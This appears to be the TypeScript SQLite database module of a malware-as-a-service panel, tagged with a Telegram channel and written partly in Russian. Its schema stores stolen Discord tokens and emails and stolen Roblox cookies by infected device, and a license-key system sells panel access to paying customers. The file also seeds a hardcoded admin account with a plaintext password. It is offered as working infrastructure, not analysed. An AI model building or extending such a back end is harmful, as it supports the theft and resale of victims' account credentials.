// t.me/SentinelLinks

import path from "path"
import { v4 as uuidv4 } from "uuid"

// Lazy initialization — import better-sqlite3 only when needed (not at build time)
let db: any = null
let dbInitialized = false

function getDb() {
  if (!db) {
    const Database = require("better-sqlite3")
    const dbPath = path.join(process.cwd(), "grob.db")
    db = new Database(dbPath)
    db.pragma("foreign_keys = ON")
  }
  return db
}

// Initialize tables if they don't exist
export function initializeDatabase() {
  if (dbInitialized) return
  
  const database = getDb()
  
  try {
    database.exec(`
      CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY,
        username TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL,
        is_admin INTEGER DEFAULT 0,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
        license_key TEXT,
        license_expiry TEXT,
        uid TEXT UNIQUE NOT NULL,
        blocked INTEGER DEFAULT 0
      );

      CREATE TABLE IF NOT EXISTS license_keys (
        id TEXT PRIMARY KEY,
        key TEXT UNIQUE NOT NULL,
        created_by TEXT NOT NULL,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
        duration TEXT NOT NULL,
        max_activations INTEGER NOT NULL,
        activations INTEGER DEFAULT 0,
        is_active INTEGER DEFAULT 1,
        FOREIGN KEY (created_by) REFERENCES users(id)
      );

      CREATE TABLE IF NOT EXISTS license_activations (
        id TEXT PRIMARY KEY,
        license_id TEXT NOT NULL,
        user_id TEXT NOT NULL,
        activated_at TEXT DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (license_id) REFERENCES license_keys(id),
        FOREIGN KEY (user_id) REFERENCES users(id),
        UNIQUE(license_id, user_id)
      );

      CREATE TABLE IF NOT EXISTS device_owners (
        device_id TEXT PRIMARY KEY,
        user_uid TEXT NOT NULL,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_uid) REFERENCES users(uid)
      );

      CREATE TABLE IF NOT EXISTS stealer_discord (
        id TEXT PRIMARY KEY,
        user_uid TEXT NOT NULL,
        device_id TEXT NOT NULL,
        token TEXT NOT NULL,
        username TEXT,
        display_name TEXT,
        email TEXT,
        user_id TEXT,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_uid) REFERENCES users(uid)
      );

      CREATE TABLE IF NOT EXISTS stealer_roblox (
        id TEXT PRIMARY KEY,
        user_uid TEXT NOT NULL,
        device_id TEXT NOT NULL,
        cookie TEXT NOT NULL,
        username TEXT,
        roblox_id TEXT,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_uid) REFERENCES users(uid)
      );

      CREATE TABLE IF NOT EXISTS news (
        id TEXT PRIMARY KEY,
        title TEXT NOT NULL,
        content TEXT NOT NULL,
        created_by TEXT NOT NULL,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (created_by) REFERENCES users(id)
      );
    `)

    // Insert default admin if not exists
    const adminExists = database
      .prepare("SELECT id FROM users WHERE username = ?")
      .get("ORIXMAN")
    if (!adminExists) {
      database.prepare(`
        INSERT INTO users (id, username, password, is_admin, uid, license_key, license_expiry)
        VALUES (?, ?, ?, ?, ?, ?, ?)
      `).run(
        "admin-001",
        "ORIXMAN",
        "180886",
        1,
        "admin-uid-001",
        "ADMIN-PERMANENT",
        "forever",
      )
    }
    
    dbInitialized = true
    console.log("[Database] Initialized successfully")
  } catch (error) {
    console.error("[Database] Initialization error:", error)
  }
}

// User functions
export interface User {
  id: string
  username: string
  password: string
  is_admin: number
  created_at: string
  license_key?: string
  license_expiry?: string
  uid: string
  blocked: number
}

export function getUserByUsername(username: string): User | undefined {
  try {
    initializeDatabase()
    return getDb().prepare("SELECT * FROM users WHERE username = ?").get(username) as
      | User
      | undefined
  } catch (error) {
    console.error("Error getting user by username:", error)
    return undefined
  }
}

export function getUserById(id: string): User | undefined {
  try {
    initializeDatabase()
    return getDb().prepare("SELECT * FROM users WHERE id = ?").get(id) as User | undefined
  } catch (error) {
    console.error("Error getting user by id:", error)
    return undefined
  }
}

export function getUsers(): User[] {
  try {
    return getDb().prepare("SELECT * FROM users").all() as User[]
  } catch (error) {
    console.error("Error getting users:", error)
    return []
  }
}

export function createUser(username: string, password: string): User | null {
  try {
    const userId = uuidv4()
    const userUid = uuidv4()

    getDb().prepare(`
      INSERT INTO users (id, username, password, is_admin, uid)
      VALUES (?, ?, ?, ?, ?)
    `).run(userId, username, password, 0, userUid)

    return getUserById(userId) || null
  } catch (error) {
    console.error("Error creating user:", error)
    return null
  }
}

export function createAdminUser(username: string, password: string): User | null {
  try {
    initializeDatabase()
    const userId = uuidv4()
    const userUid = uuidv4()

    getDb().prepare(`
      INSERT INTO users (id, username, password, is_admin, uid, license_key, license_expiry)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `).run(userId, username, password, 1, userUid, "ADMIN-MANUAL", "forever")

    return getUserById(userId) || null
  } catch (error) {
    console.error("Error creating admin user:", error)
    return null
  }
}

export function updateUser(
  id: string,
  updates: Partial<User>,
): boolean {
  try {
    const fields: string[] = []
    const values: any[] = []

    Object.entries(updates).forEach(([key, value]) => {
      if (key !== "id") {
        fields.push(`${key} = ?`)
        values.push(value)
      }
    })

    if (fields.length === 0) return true

    values.push(id)
    const query = `UPDATE users SET ${fields.join(", ")} WHERE id = ?`
    getDb().prepare(query).run(...values)
    return true
  } catch (error) {
    console.error("Error updating user:", error)
    return false
  }
}

export function deleteUser(id: string): boolean {
  try {
    const user = getUserById(id)
    if (!user || user.username === "ORIXMAN") return false
    getDb().prepare("DELETE FROM users WHERE id = ?").run(id)
    return true
  } catch (error) {
    console.error("Error deleting user:", error)
    return false
  }
}

// License functions
export interface LicenseKey {
  id: string
  key: string
  created_by: string
  created_at: string
  duration: string
  max_activations: number
  activations: number
  is_active: number
}

export function getLicenseKeyByKey(key: string): LicenseKey | undefined {
  try {
    return getDb().prepare("SELECT * FROM license_keys WHERE key = ?").get(key) as
      | LicenseKey
      | undefined
  } catch (error) {
    console.error("Error getting license key:", error)
    return undefined
  }
}

export function activateLicenseKey(
  key: string,
  userId: string,
): { success: boolean; message: string } {
  try {
    let licenseKey = getLicenseKeyByKey(key)

    // Special case for ADMIN-PERMANENT key
    if (!licenseKey && key === "ADMIN-PERMANENT") {
      // Create the ADMIN-PERMANENT key if it doesn't exist
      const adminId = uuidv4()
      getDb().prepare(`
        INSERT OR IGNORE INTO license_keys (id, key, created_by, created_at, duration, max_activations, activations, is_active)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
      `).run(adminId, key, "admin-001", new Date().toISOString(), "forever", 999, 0, 1)
      
      licenseKey = getLicenseKeyByKey(key)
    }

    if (!licenseKey) {
      return { success: false, message: "Ключ лицензии не найден" }
    }

    if (!licenseKey.is_active) {
      return { success: false, message: "Ключ лицензии неактивен" }
    }

    if (licenseKey.activations >= licenseKey.max_activations) {
      return { success: false, message: "Превышено максимальное количество активаций" }
    }

    // Check if already activated
    const existing = getDb()
      .prepare(
        "SELECT * FROM license_activations WHERE license_id = ? AND user_id = ?",
      )
      .get(licenseKey.id, userId)

    if (existing) {
      return { success: false, message: "Ключ уже активирован для этого пользователя" }
    }

    // Create activation
    getDb().prepare(`
      INSERT INTO license_activations (id, license_id, user_id)
      VALUES (?, ?, ?)
    `).run(uuidv4(), licenseKey.id, userId)

    // Update license activation count
    getDb().prepare("UPDATE license_keys SET activations = activations + 1 WHERE id = ?").run(
      licenseKey.id,
    )

    // Update user with license info
    const expiryDate = licenseKey.duration === "forever"
      ? "forever"
      : new Date(Date.now() + parseInt(licenseKey.duration) * 24 * 60 * 60 * 1000)
          .toISOString()

    getDb().prepare(
      "UPDATE users SET license_key = ?, license_expiry = ? WHERE id = ?",
    ).run(key, expiryDate, userId)

    return { success: true, message: "Лицензия успешно активирована" }
  } catch (error) {
    console.error("Error activating license:", error)
    return { success: false, message: "Ошибка при активации лицензии" }
  }
}

// Create License Key function
export function createLicenseKey(licenseData: {
  id: string
  key: string
  created_by: string
  created_at: string
  duration: string
  max_activations: number
  activations: number
  is_active: number
}): LicenseKey | null {
  try {
    const result = getDb().prepare(`
      INSERT INTO license_keys (id, key, created_by, created_at, duration, max_activations, activations, is_active)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      licenseData.id,
      licenseData.key,
      licenseData.created_by,
      licenseData.created_at,
      licenseData.duration,
      licenseData.max_activations,
      licenseData.activations,
      licenseData.is_active
    )

    if (result.changes > 0) {
      return getLicenseKeyByKey(licenseData.key)
    }
    return null
  } catch (error) {
    console.error("Error creating license key:", error)
    return null
  }
}

// News functions
export interface News {
  id: string
  title: string
  content: string
  created_by: string
  created_at: string
}

export function getNews(): News[] {
  try {
    return getDb().prepare("SELECT * FROM news ORDER BY created_at DESC").all() as News[]
  } catch (error) {
    console.error("Error getting news:", error)
    return []
  }
}

export function createNews(title: string, content: string, createdBy: string): News | null {
  try {
    const id = uuidv4()
    getDb().prepare(`
      INSERT INTO news (id, title, content, created_by)
      VALUES (?, ?, ?, ?)
    `).run(id, title, content, createdBy)

    return getDb().prepare("SELECT * FROM news WHERE id = ?").get(id) as News | null
  } catch (error) {
    console.error("Error creating news:", error)
    return null
  }
}

export function deleteNews(id: string): boolean {
  try {
    getDb().prepare("DELETE FROM news WHERE id = ?").run(id)
    return true
  } catch (error) {
    console.error("Error deleting news:", error)
    return false
  }
}

// Device functions
export function getDevicesByUID(uid: string): any[] {
  try {
    return getDb()
      .prepare(
        `
      SELECT * FROM device_owners WHERE user_uid = ?
    `,
      )
      .all(uid)
  } catch (error) {
    console.error("Error getting devices by UID:", error)
    return []
  }
}

export function setDeviceOwner(
  deviceId: string,
  userUid: string,
): boolean {
  try {
    getDb().prepare(`
      INSERT OR REPLACE INTO device_owners (device_id, user_uid)
      VALUES (?, ?)
    `).run(deviceId, userUid)
    return true
  } catch (error) {
    console.error("Error setting device owner:", error)
    return false
  }
}

// Database reset
export function resetDatabase(): boolean {
  try {
    getDb().exec(`
      DELETE FROM news;
      DELETE FROM stealer_roblox;
      DELETE FROM stealer_discord;
      DELETE FROM device_owners;
      DELETE FROM license_activations;
      DELETE FROM license_keys;
      DELETE FROM users;
    `)

    // Re-insert default admin
    getDb().prepare(`
      INSERT INTO users (id, username, password, is_admin, uid, license_key, license_expiry)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `).run(
      "admin-001",
      "ORIXMAN",
      "180886",
      1,
      "admin-uid-001",
      "ADMIN-PERMANENT",
      "forever",
    )

    return true
  } catch (error) {
    console.error("Error resetting database:", error)
    return false
  }
}

// Export getDb for direct access
export { getDb }
